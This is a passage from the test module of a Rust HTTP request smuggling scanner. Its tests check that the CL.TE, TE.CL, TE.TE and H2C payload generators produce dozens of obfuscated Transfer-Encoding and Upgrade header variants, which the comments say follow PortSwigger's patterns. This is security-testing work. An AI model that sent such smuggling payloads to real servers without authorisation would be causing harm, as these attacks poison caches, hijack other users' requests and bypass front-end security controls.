        method, path, host, custom_header_str, cookie_str, host
    ));

    payloads
}

/// Helper function to check if a payload contains a Transfer-Encoding related header
/// This handles various obfuscation techniques including control characters in header names
/// Note: This is only used in tests to verify payload generation, not in production code
#[cfg(test)]
fn contains_te_header_pattern(payload: &str) -> bool {
    let payload_lower = payload.to_lowercase();

    // Standard patterns (most reliable)
    if payload_lower.contains("transfer-encoding") ||
       payload_lower.contains("transfer_encoding") ||  // underjoin pattern
       payload_lower.contains("transfer encoding") ||  // spacejoin pattern
       payload_lower.contains("transfer\\encoding") || // backslash pattern
       payload_lower.contains("content-encoding")
    {
        // Content-Encoding confusion
        return true;
    }

    // URL-encoded patterns
    if payload_lower.contains("transfer%") || payload_lower.contains("=?") {
        return true;
    }

    // Partial patterns for control character obfuscation
    // These catch cases where control chars (CR, null, etc.) are inserted into header names
    if payload_lower.contains("nsfer-encoding") || // Handles CR in "Tra\rnsfer-Encoding"
       payload_lower.contains("encoding: chunked") ||
       payload_lower.contains("encoding:chunked") ||
       payload_lower.contains("encoding:\tchunked")
    {
        return true;
    }

    // Check for "chunked" value which should appear in all TE headers
    if payload_lower.contains("chunked") {
        // Also verify there's some encoding-related text nearby
        if payload_lower.contains("encoding")
            || payload_lower.contains("encod")
            || payload_lower.contains("transf")
        {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    //! Tests for HTTP request smuggling payload generation
    //!
    //! This module contains comprehensive tests for:
    //! - CL.TE (Content-Length vs Transfer-Encoding) payload generation
    //! - TE.CL (Transfer-Encoding vs Content-Length) payload generation
    //! - TE.TE (Transfer-Encoding obfuscation) payload generation
    //! - Transfer-Encoding header variations and mutations
    //! - PortSwigger http-request-smuggler pattern compatibility
    //! - Custom headers and cookies formatting
    //! - Payload structure and HTTP compliance

    use super::*;
    use crate::model::CheckResult;

    // Test helper functions to expose private functions for testing
    pub(crate) fn format_custom_headers_test_helper(custom_headers: &[String]) -> String {
        format_custom_headers(custom_headers)
    }

    pub(crate) fn format_cookies_test_helper(cookies: &[String]) -> String {
        format_cookies(cookies)
    }

    #[test]
    fn test_cl_te_payloads_generation() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[], &[]);
        assert!(!payloads.is_empty());
        // Updated to reflect extended mutations from PortSwigger http-request-smuggler
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 payloads, got {}",
            payloads.len()
        );

        // Check that all payloads contain required components
        for (i, payload) in payloads.iter().enumerate() {
            assert!(
                payload.contains("Content-Length: 6"),
                "Payload {} missing Content-Length",
                i
            );
            // Use helper function to check for Transfer-Encoding header patterns
            assert!(
                contains_te_header_pattern(payload),
                "Payload {} should contain some form of Transfer-Encoding header. First 200 chars: {}",
                i,
                &payload[..std::cmp::min(200, payload.len())]
            );
            assert!(payload.contains("POST /test HTTP/1.1"));
            assert!(payload.contains("Host: example.com"));
        }
    }

    #[test]
    fn test_te_cl_payloads_generation() {
        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[], &[]);
        assert!(!payloads.is_empty());
        // Updated to reflect extended mutations from PortSwigger http-request-smuggler
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 payloads, got {}",
            payloads.len()
        );

        for (i, payload) in payloads.iter().enumerate() {
            assert!(payload.contains("Content-Length: 4"));
            // Use helper function to check for Transfer-Encoding header patterns
            assert!(
                contains_te_header_pattern(payload),
                "Payload {} should contain some form of Transfer-Encoding header",
                i
            );
            assert!(payload.contains("GET /api HTTP/1.1"));
        }
    }

    #[test]
    fn test_te_te_payloads_generation() {
        let payloads = get_te_te_payloads("/", "site.com", "POST", &[], &[]);
        assert!(!payloads.is_empty());
        // Updated to reflect extended mutations from PortSwigger http-request-smuggler
        assert!(
            payloads.len() >= 40,
            "Expected at least 40 payloads, got {}",
            payloads.len()
        );

        for payload in &payloads {
            // Check for at least one Transfer-Encoding header (case insensitive)
            let payload_lower = payload.to_lowercase();
            assert!(
                payload_lower.contains("transfer-encoding")
                    || payload_lower.contains("transfer_encoding")
                    || payload_lower.contains("content-encoding"),
                "Payload should contain some form of Transfer-Encoding or Content-Encoding header"
            );
            assert!(payload.contains("POST / HTTP/1.1"));
        }
    }

    #[test]
    fn test_custom_headers_integration() {
        let custom_headers = vec![
            "X-Custom-Header: value1".to_string(),
            "Authorization: Bearer token".to_string(),
        ];

        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers, &[]);

        for payload in &payloads {
            assert!(payload.contains("X-Custom-Header: value1"));
            assert!(payload.contains("Authorization: Bearer token"));
        }
    }

    #[test]
    fn test_check_result_serialization() {
        let result = CheckResult {
            check_type: "CL.TE".to_string(),
            vulnerable: false,
            payload_index: None,
            normal_status: "HTTP/1.1 200 OK".to_string(),
            attack_status: None,
            normal_duration_ms: 150,
            attack_duration_ms: None,
            timestamp: "2024-01-01T12:00:00Z".to_string(),
            payload: None,
        };

        let json = serde_json::to_string(&result);
        assert!(json.is_ok());

        let deserialized: Result<CheckResult, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }

    #[test]
    fn test_cl_te_payload_structure() {
        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[], &[]);
        let payload = &payloads[0];

        // Check for proper HTTP request structure
        assert!(payload.starts_with("POST / HTTP/1.1\r\n"));
        assert!(payload.contains("Host: example.com\r\n"));
        assert!(payload.contains("Connection: keep-alive\r\n"));
        assert!(payload.contains("Content-Length: 6"));
        assert!(payload.contains("Transfer-Encoding: chunked"));

        // Check for chunked encoding format
        assert!(payload.contains("0\r\n"));
    }

    #[test]
    fn test_te_cl_payload_structure() {
        let payloads = get_te_cl_payloads("/api/test", "target.com", "GET", &[], &[]);
        let payload = &payloads[0];

        assert!(payload.starts_with("GET /api/test HTTP/1.1\r\n"));
        assert!(payload.contains("Host: target.com"));
        assert!(payload.contains("Content-Length: 4"));
        assert!(payload.contains("Transfer-Encoding: chunked"));

        // Check for chunked encoding format
        assert!(payload.contains("1\r\n"));
        assert!(payload.contains("A\r\n"));
        assert!(payload.contains("0\r\n"));
    }

    #[test]
    fn test_te_te_payload_structure() {
        let payloads = get_te_te_payloads("/test", "site.com", "POST", &[], &[]);
        let payload = &payloads[0];

        assert!(payload.starts_with("POST /test HTTP/1.1\r\n"));
        assert!(payload.contains("Host: site.com"));
        assert!(payload.contains("Content-Length: 4"));

        // Should have two Transfer-Encoding headers
        let te_count = payload.matches("Transfer-Encoding:").count();
        assert_eq!(te_count, 2);
    }

    #[test]
    fn test_transfer_encoding_variations_cl_te() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // Should have many variations now - at least 50 from PortSwigger patterns
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 variations, got {}",
            payloads.len()
        );

        // Check for at least the basic variations
        let has_basic = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\r\n"));
        let has_space_prefix = payloads
            .iter()
            .any(|p| p.contains(" Transfer-Encoding: chunked"));
        let has_space_before_colon = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding : chunked"));
        let has_tab = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:\tchunked"));
        let has_underscore = payloads
            .iter()
            .any(|p| p.contains("Transfer_Encoding: chunked"));
        let has_quoted = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: \"chunked\""));
        let has_lowercase = payloads
            .iter()
            .any(|p| p.contains("transfer-encoding: chunked"));

        assert!(has_basic, "Missing basic Transfer-Encoding header");
        assert!(has_space_prefix, "Missing space prefix variation");
        assert!(
            has_space_before_colon,
            "Missing space before colon variation"
        );
        assert!(has_tab, "Missing tab variation");
        assert!(has_underscore, "Missing underscore variation (underjoin1)");
        assert!(has_quoted, "Missing quoted variation");
        assert!(has_lowercase, "Missing lowercase variation");
    }

    #[test]
    fn test_transfer_encoding_variations_te_cl() {
        let payloads = get_te_cl_payloads("/", "test.com", "POST", &[], &[]);

        // Should have many variations now - at least 50 from PortSwigger patterns
        assert!(
            payloads.len() >= 50,
            "Expected at least 50 variations, got {}",
            payloads.len()
        );

        // Verify some basic variations are present
        let has_basic = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\r\n"));
        let has_space_prefix = payloads
            .iter()
            .any(|p| p.contains(" Transfer-Encoding: chunked"));
        let has_underscore = payloads
            .iter()
            .any(|p| p.contains("Transfer_Encoding: chunked"));

        assert!(has_basic, "Missing basic variation");
        assert!(has_space_prefix, "Missing space prefix variation");
        assert!(has_underscore, "Missing underscore variation (underjoin1)");
    }

    #[test]
    fn test_te_te_dual_encoding_variations() {
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);

        // Should have many variations now - at least 40 from PortSwigger patterns
        assert!(
            payloads.len() >= 40,
            "Expected at least 40 variations, got {}",
            payloads.len()
        );

        // Check some specific variations exist
        let has_x_custom = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: x-custom"));
        let has_identity = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: identity"));
        let has_cow = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: cow"));
        let has_content_encoding = payloads
            .iter()
            .any(|p| p.contains("Content-Encoding: chunked"));

        assert!(has_x_custom, "Missing x-custom variation");
        assert!(has_identity, "Missing identity variation");
        assert!(has_cow, "Missing cow variation");
        assert!(
            has_content_encoding,
            "Missing Content-Encoding confusion variation"
        );

        // Most payloads should have at least two header-related entries (case insensitive)
        // Some payloads with extended ASCII may have fewer due to encoding issues
        let mut count_with_two_headers = 0;
        for payload in &payloads {
            let payload_lower = payload.to_lowercase();
            let te_count = payload_lower.matches("transfer-encoding").count();
            let ce_count = payload_lower.matches("content-encoding").count();
            let connection_te = if payload_lower.contains("connection: transfer-encoding") {
                1
            } else {
                0
            };
            let total_count = te_count + ce_count + connection_te;
            if total_count >= 2 {
                count_with_two_headers += 1;
            }
        }
        // At least 90% of payloads should have 2+ TE/CE headers
        let ratio = count_with_two_headers as f64 / payloads.len() as f64;
        assert!(
            ratio >= 0.9,
            "Expected at least 90% of payloads to have 2+ TE/CE headers, got {}%",
            ratio * 100.0
        );
    }

    #[test]
    fn test_custom_headers_placement() {
        let custom_headers = vec![
            "X-API-Key: secret123".to_string(),
            "User-Agent: TestAgent/1.0".to_string(),
        ];

        let payload = &get_cl_te_payloads("/", "example.com", "POST", &custom_headers, &[])[0];

        // Custom headers should be present
        assert!(payload.contains("X-API-Key: secret123"));
        assert!(payload.contains("User-Agent: TestAgent/1.0"));

        // Should appear before Content-Length (standard ordering)
        let custom_pos = payload.find("X-API-Key").unwrap();
        let cl_pos = payload.find("Content-Length").unwrap();
        assert!(custom_pos < cl_pos);
    }

    #[test]
    fn test_empty_custom_headers() {
        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[], &[]);

        // Should not have extra empty lines from custom headers
        for payload in &payloads {
            // Count consecutive \n characters - should not have more than expected
            assert!(!payload.contains("\n\n\n"));
        }
    }

    #[test]
    fn test_different_methods() {
        let methods = vec!["GET", "POST", "PUT", "DELETE", "PATCH"];

        for method in methods {
            let payloads = get_cl_te_payloads("/api", "test.com", method, &[], &[]);
            for payload in &payloads {
                assert!(payload.starts_with(&format!("{} /api HTTP/1.1", method)));
            }
        }
    }

    #[test]
    fn test_different_paths() {
        let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];

        for path in paths {
            let payloads = get_te_cl_payloads(path, "test.com", "POST", &[], &[]);
            for payload in &payloads {
                assert!(payload.contains(&format!("POST {} HTTP/1.1", path)));
            }
        }
    }

    #[test]
    fn test_different_hosts() {
        let hosts = vec!["example.com", "api.example.com", "192.168.1.1", "localhost"];

        for host in hosts {
            let payloads = get_te_te_payloads("/", host, "POST", &[], &[]);
            for payload in &payloads {
                assert!(payload.contains(&format!("Host: {}", host)));
            }
        }
    }

    #[test]
    fn test_payload_http_compliance() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[], &[]);

        for payload in &payloads {
            // Each line should end with \r\n
            let lines: Vec<&str> = payload.split("\r\n").collect();

            // Should have HTTP version in first line
            assert!(lines[0].contains("HTTP/1.1"));

            // Should have proper header format (key: value)
            let has_host = lines.iter().any(|line| line.starts_with("Host:"));
            assert!(has_host, "Missing Host header");

            let has_connection = lines.iter().any(|line| line.starts_with("Connection:"));
            assert!(has_connection, "Missing Connection header");
        }
    }

    #[test]
    fn test_chunked_encoding_format() {
        let payloads = get_te_cl_payloads("/", "test.com", "GET", &[], &[]);

        for payload in &payloads {
            // Should contain chunk size "1" followed by chunk data "A"
            assert!(payload.contains("1\r\n"));
            assert!(payload.contains("A\r\n"));
            // Should end with zero chunk
            assert!(payload.contains("0\r\n"));
        }
    }

    #[test]
    fn test_content_length_values() {
        let cl_te_payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        for payload in &cl_te_payloads {
            assert!(payload.contains("Content-Length: 6"));
        }

        let te_cl_payloads = get_te_cl_payloads("/", "test.com", "POST", &[], &[]);
        for payload in &te_cl_payloads {
            assert!(payload.contains("Content-Length: 4"));
        }

        let te_te_payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
        for payload in &te_te_payloads {
            assert!(payload.contains("Content-Length: 4"));
        }
    }

    // ========== New tests for PortSwigger http-request-smuggler patterns ==========

    #[test]
    fn test_portswigger_underjoin_pattern() {
        // Test that underscore variation (underjoin1) is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_underscore = payloads
            .iter()
            .any(|p| p.contains("Transfer_Encoding: chunked"));
        assert!(
            has_underscore,
            "Missing Transfer_Encoding (underjoin1) pattern"
        );
    }

    #[test]
    fn test_portswigger_spacejoin_pattern() {
        // Test that space-in-name variation (spacejoin1) is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_space_join = payloads
            .iter()
            .any(|p| p.contains("Transfer Encoding: chunked"));
        assert!(
            has_space_join,
            "Missing Transfer Encoding (spacejoin1) pattern"
        );
    }

    #[test]
    fn test_portswigger_nospace_pattern() {
        // Test that no-space-after-colon variation (nospace1) is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_nospace = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:chunked"));
        assert!(
            has_nospace,
            "Missing Transfer-Encoding:chunked (nospace1) pattern"
        );
    }

    #[test]
    fn test_portswigger_linewrapped_pattern() {
        // Test that line-wrapped variation is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_linewrap = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:\n chunked"));
        assert!(has_linewrap, "Missing line-wrapped pattern");
    }

    #[test]
    fn test_portswigger_vertwrap_pattern() {
        // Test that vertical tab wrap variation is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_vertwrap = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding:\x0Bchunked"));
        assert!(has_vertwrap, "Missing vertical tab variation");
    }

    #[test]
    fn test_portswigger_case_variations() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // UPPERCASE
        let has_uppercase = payloads.iter().any(|p| p.contains("TRANSFER-ENCODING:"));
        assert!(has_uppercase, "Missing UPPERCASE pattern");

        // lowercase
        let has_lowercase = payloads.iter().any(|p| p.contains("transfer-encoding:"));
        assert!(has_lowercase, "Missing lowercase pattern");

        // Mixed case
        let has_mixed = payloads
            .iter()
            .any(|p| p.contains("tRaNsFeR-eNcOdInG:") || p.contains("TrAnSfEr-EnCoDiNg:"));
        assert!(has_mixed, "Missing mixed case pattern");
    }

    #[test]
    fn test_portswigger_quoted_values() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // Double quoted
        let has_double_quoted = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: \"chunked\""));
        assert!(has_double_quoted, "Missing double-quoted chunked value");

        // Single quoted
        let has_single_quoted = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: 'chunked'"));
        assert!(has_single_quoted, "Missing single-quoted chunked value");
    }

    #[test]
    fn test_portswigger_comma_encoding() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // commaCow - chunked, identity
        let has_comma_cow = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked, identity"));
        assert!(
            has_comma_cow,
            "Missing chunked, identity (commaCow) pattern"
        );

        // cowComma - identity, chunked
        let has_cow_comma = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: identity, chunked"));
        assert!(
            has_cow_comma,
            "Missing identity, chunked (cowComma) pattern"
        );
    }

    #[test]
    fn test_portswigger_lazygrep_pattern() {
        // Test that truncated "chunk" value is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_lazy = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunk\r\n"));
        assert!(has_lazy, "Missing truncated chunk (lazygrep) pattern");
    }

    #[test]
    fn test_portswigger_backslash_pattern() {
        // Test that backslash variation is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_backslash = payloads
            .iter()
            .any(|p| p.contains("Transfer\\Encoding: chunked"));
        assert!(has_backslash, "Missing backslash variation");
    }

    #[test]
    fn test_portswigger_suffix_patterns() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // CR suffix (0dsuffix)
        let has_cr_suffix = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\r\r\n"));
        assert!(has_cr_suffix, "Missing CR suffix (0dsuffix) pattern");

        // Tab suffix
        let has_tab_suffix = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\t\r\n"));
        assert!(has_tab_suffix, "Missing tab suffix pattern");
    }

    #[test]
    fn test_portswigger_badsetup_patterns() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // badsetupCR - CR only before TE header
        let has_cr_setup = payloads
            .iter()
            .any(|p| p.contains("Foo: bar\rTransfer-Encoding:"));
        assert!(has_cr_setup, "Missing badsetupCR pattern");

        // badsetupLF - LF only before TE header
        let has_lf_setup = payloads
            .iter()
            .any(|p| p.contains("Foo: bar\nTransfer-Encoding:"));
        assert!(has_lf_setup, "Missing badsetupLF pattern");
    }

    #[test]
    fn test_portswigger_0dspam_pattern() {
        // CR in middle of header name
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_0dspam = payloads
            .iter()
            .any(|p| p.contains("Tra\rnsfer-Encoding:") || p.contains("Transfer-\rEncoding:"));
        assert!(has_0dspam, "Missing 0dspam pattern");
    }

    #[test]
    fn test_portswigger_url_encode_pattern() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_url_encode = payloads.iter().any(|p| p.contains("Transfer-%45ncoding:"));
        assert!(
            has_url_encode,
            "Missing URL-encoded header (encode) pattern"
        );
    }

    #[test]
    fn test_portswigger_mime_encode_pattern() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_mime = payloads
            .iter()
            .any(|p| p.contains("=?iso-8859-1?B?") || p.contains("=?UTF-8?B?"));
        assert!(has_mime, "Missing MIME-encoded value pattern");
    }

    #[test]
    fn test_te_te_content_encoding_confusion() {
        // Test that Content-Encoding confusion is present in TE.TE
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_content_enc = payloads
            .iter()
            .any(|p| p.contains("Content-Encoding: chunked"));
        assert!(
            has_content_enc,
            "Missing Content-Encoding confusion pattern"
        );
    }

    #[test]
    fn test_te_te_connection_header_combination() {
        // Test that Connection header combination is present
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_connection = payloads
            .iter()
            .any(|p| p.contains("Connection: Transfer-Encoding"));
        assert!(
            has_connection,
            "Missing Connection header combination pattern"
        );
    }

    #[test]
    fn test_cookie_header_format() {
        let cookies = vec!["session=abc123".to_string(), "user=test".to_string()];
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &cookies);

        for payload in &payloads {
            assert!(
                payload.contains("Cookie: session=abc123; user=test\r\n"),
                "Cookie header should be properly formatted"
            );
        }
    }

    #[test]
    fn test_format_custom_headers_single() {
        let headers = vec!["X-Custom: value".to_string()];
        let result = format_custom_headers_test_helper(&headers);
        assert_eq!(result, "X-Custom: value\r\n");
    }

    #[test]
    fn test_format_custom_headers_multiple() {
        let headers = vec![
            "X-Custom-1: value1".to_string(),
            "X-Custom-2: value2".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        let result = format_custom_headers_test_helper(&headers);
        assert_eq!(
            result,
            "X-Custom-1: value1\r\nX-Custom-2: value2\r\nAuthorization: Bearer token\r\n"
        );
    }

    #[test]
    fn test_format_cookies_single() {
        let cookies = vec!["session=abc123".to_string()];
        let result = format_cookies_test_helper(&cookies);
        assert_eq!(result, "Cookie: session=abc123\r\n");
    }

    #[test]
    fn test_format_cookies_multiple() {
        let cookies = vec![
            "session=abc123".to_string(),
            "user=test".to_string(),
            "preferences=dark".to_string(),
        ];
        let result = format_cookies_test_helper(&cookies);
        assert_eq!(
            result,
            "Cookie: session=abc123; user=test; preferences=dark\r\n"
        );
    }

    #[test]
    fn test_contains_te_header_pattern_standard() {
        let payload = "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n";
        assert!(
            contains_te_header_pattern(payload),
            "Standard Transfer-Encoding header should be detected"
        );
    }

    #[test]
    fn test_contains_te_header_pattern_obfuscated() {
        // Test various obfuscation patterns
        let patterns = vec![
            "Transfer_Encoding: chunked",   // Underscore
            "Transfer Encoding: chunked",   // Space
            "transfer-encoding: chunked",   // Lowercase
            "TRANSFER-ENCODING: CHUNKED",   // Uppercase
            "Transfer-Encoding:chunked",    // No space
            "Transfer-%45ncoding: chunked", // URL-encoded
            "Content-Encoding: chunked",    // Content-Encoding confusion
            "Tra\rnsfer-Encoding: chunked", // CR in name
        ];

        for pattern in patterns {
            assert!(
                contains_te_header_pattern(pattern),
                "Pattern '{}' should be detected",
                pattern
            );
        }
    }

    #[test]
    fn test_contains_te_header_pattern_negative() {
        let payload = "POST / HTTP/1.1\r\nContent-Length: 10\r\n\r\n";
        assert!(
            !contains_te_header_pattern(payload),
            "Payload without Transfer-Encoding should not be detected"
        );
    }

    #[test]
    fn test_te_header_variations_count() {
        // Ensure we have a comprehensive set of variations
        let te_variations = get_te_header_variations();

        // We should have at least 70 unique variations based on PortSwigger patterns
        assert!(
            te_variations.len() >= 70,
            "Expected at least 70 Transfer-Encoding variations, got {}",
            te_variations.len()
        );
    }

    // ========== H2C Smuggling Tests ==========

    #[test]
    fn test_h2c_payloads_generation() {
        let payloads = get_h2c_payloads("/", "example.com", "GET", &[], &[]);
        assert!(!payloads.is_empty(), "H2C payloads should not be empty");

        // Should have multiple variations
        assert!(
            payloads.len() >= 20,
            "Expected at least 20 H2C payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_h2c_basic_payload_structure() {
        let payloads = get_h2c_payloads("/test", "example.com", "GET", &[], &[]);
        let payload = &payloads[0];

        // Check for basic H2C upgrade headers
        assert!(
            payload.contains("Upgrade: h2c"),
            "Missing Upgrade: h2c header"
        );
        assert!(
            payload.contains("Connection: Upgrade"),
            "Missing Connection: Upgrade header"
        );
        assert!(
            payload.contains("HTTP2-Settings:"),
            "Missing HTTP2-Settings header"
        );
        assert!(
            payload.starts_with("GET /test HTTP/1.1"),
            "Should start with correct request line"
        );
        assert!(payload.contains("Host: example.com"), "Missing Host header");
    }

    #[test]
    fn test_h2c_upgrade_header_variations() {
        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);

        // Check for uppercase variation
        let has_uppercase = payloads.iter().any(|p| p.contains("Upgrade: H2C"));
        assert!(has_uppercase, "Missing uppercase H2C variation");

        // Check for multiple protocols
        let has_multiple = payloads
            .iter()
            .any(|p| p.contains("Upgrade: h2c, http/1.1"));
        assert!(has_multiple, "Missing multiple protocols variation");

        // Check for space variations
        let has_space_prefix = payloads.iter().any(|p| p.contains(" Upgrade: h2c"));
        assert!(has_space_prefix, "Missing space prefix variation");
    }

    #[test]
    fn test_h2c_connection_header_variations() {
        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &[]);

        // Check for lowercase variation
        let has_lowercase = payloads
            .iter()
            .any(|p| p.contains("Connection: upgrade, http2-settings"));
        assert!(has_lowercase, "Missing lowercase connection variation");

        // Check for uppercase variation
        let has_uppercase = payloads
            .iter()
            .any(|p| p.contains("Connection: UPGRADE, HTTP2-SETTINGS"));
        assert!(has_uppercase, "Missing uppercase connection variation");

        // Check for different orderings
        let has_reordered = payloads
            .iter()
            .any(|p| p.contains("Connection: HTTP2-Settings, Upgrade"));
        assert!(has_reordered, "Missing reordered connection variation");
    }

    #[test]
    fn test_h2c_http2_settings_variations() {
        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);

        // Check for lowercase variation
        let has_lowercase = payloads.iter().any(|p| p.contains("http2-settings:"));
        assert!(has_lowercase, "Missing lowercase HTTP2-Settings variation");

        // Check for no-space variation
        let has_nospace = payloads.iter().any(|p| p.contains("HTTP2-Settings:AAM"));
        assert!(has_nospace, "Missing no-space HTTP2-Settings variation");

        // Check for different settings values
        let has_minimal = payloads
            .iter()
            .any(|p| p.contains("HTTP2-Settings: AAQAAP__"));
        assert!(has_minimal, "Missing minimal settings variation");
    }

    #[test]
    fn test_h2c_with_transfer_encoding() {
        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);

        // Should have payload combining H2C with Transfer-Encoding
        let has_te_combo = payloads
            .iter()
            .any(|p| p.contains("Upgrade: h2c") && p.contains("Transfer-Encoding: chunked"));
        assert!(has_te_combo, "Missing H2C + Transfer-Encoding combination");
    }

    #[test]
    fn test_h2c_with_content_length_smuggling() {
        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &[]);

        // Check for smuggled request payload
        let has_smuggled = payloads.iter().any(|p| {
            p.contains("Upgrade: h2c")
                && p.contains("Content-Length: 30")
                && p.contains("GET /smuggled HTTP/1.1")
        });
        assert!(
            has_smuggled,
            "Missing H2C smuggling with Content-Length payload"
        );
    }

    #[test]
    fn test_h2c_double_upgrade_headers() {
        let payloads = get_h2c_payloads("/", "test.com", "POST", &[], &[]);

        // Check for double upgrade headers (similar to TE.TE obfuscation)
        let has_double_upgrade = payloads.iter().any(|p| {
            let upgrade_count = p.matches("Upgrade:").count();
            upgrade_count >= 2
        });
        assert!(
            has_double_upgrade,
            "Missing double Upgrade header variation"
        );
    }

    #[test]
    fn test_h2c_with_custom_headers() {
        let custom_headers = vec![
            "X-Custom: value".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        let payloads = get_h2c_payloads("/api", "test.com", "POST", &custom_headers, &[]);

        for payload in &payloads {
            assert!(payload.contains("X-Custom: value"), "Missing custom header");
            assert!(
                payload.contains("Authorization: Bearer token"),
                "Missing auth header"
            );
        }
    }

    #[test]
    fn test_h2c_with_cookies() {
        let cookies = vec!["session=abc123".to_string(), "user=test".to_string()];
        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &cookies);

        for payload in &payloads {
            assert!(
                payload.contains("Cookie: session=abc123; user=test"),
                "Missing cookie header"
            );
        }
    }

    #[test]
    fn test_h2c_different_methods() {
        let methods = vec!["GET", "POST", "PUT", "DELETE"];

        for method in methods {
            let payloads = get_h2c_payloads("/api", "test.com", method, &[], &[]);
            for payload in &payloads {
                assert!(
                    payload.starts_with(&format!("{} /api HTTP/1.1", method)),
                    "Method {} not properly set",
                    method
                );
            }
        }
    }

    #[test]
    fn test_h2c_different_paths() {
        let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];

        for path in paths {
            let payloads = get_h2c_payloads(path, "test.com", "GET", &[], &[]);
            for payload in &payloads {
                assert!(
                    payload.contains(&format!("GET {} HTTP/1.1", path)),
                    "Path {} not properly set",
                    path
                );
            }
        }
    }

    #[test]
    fn test_h2c_http_compliance() {
        let payloads = get_h2c_payloads("/test", "example.com", "GET", &[], &[]);

        for payload in &payloads {
            // Each line should end with \r\n
            let lines: Vec<&str> = payload.split("\r\n").collect();

            // Should have HTTP version in first line
            assert!(
                lines[0].contains("HTTP/1.1"),
                "Missing HTTP/1.1 in request line"
            );

            // Should have proper header format
            let has_host = lines.iter().any(|line| line.starts_with("Host:"));
            assert!(has_host, "Missing Host header");

            // Check for Upgrade header (case-insensitive, may have leading space, may have space before colon)
            let has_upgrade = lines.iter().any(|line| {
                let trimmed = line.trim_start().to_lowercase();
                trimmed.starts_with("upgrade") && trimmed.contains("h2c")
            });
            assert!(
                has_upgrade,
                "Missing Upgrade header in payload:\n{}",
                payload
            );
        }
    }

    #[test]
    fn test_h2c_settings_header_position() {
        let payloads = get_h2c_payloads("/", "test.com", "GET", &[], &[]);

        // Should have at least one payload with HTTP2-Settings before Host header
        // The payload with early settings has "HTTP2-Settings:" after "GET / HTTP/1.1"
        let has_early_settings = payloads.iter().any(|p| {
            // Find the positions of first occurrence
            let lines: Vec<&str> = p.split("\r\n").collect();
            let mut host_idx = None;
            let mut settings_idx = None;

            for (idx, line) in lines.iter().enumerate() {
                if line.starts_with("Host:") && host_idx.is_none() {
                    host_idx = Some(idx);
                }
                if line.to_lowercase().starts_with("http2-settings:") && settings_idx.is_none() {
                    settings_idx = Some(idx);
                }
            }

            match (host_idx, settings_idx) {
                (Some(h), Some(s)) => s < h,
                _ => false,
            }
        });
        assert!(
            has_early_settings,
            "Missing early HTTP2-Settings position variation"
        );
    }

    // ========== HTTP/2 (H2) Smuggling Tests ==========

    #[test]
    fn test_h2_payloads_generation() {
        let payloads = get_h2_payloads("/", "example.com", "GET", &[], &[]);
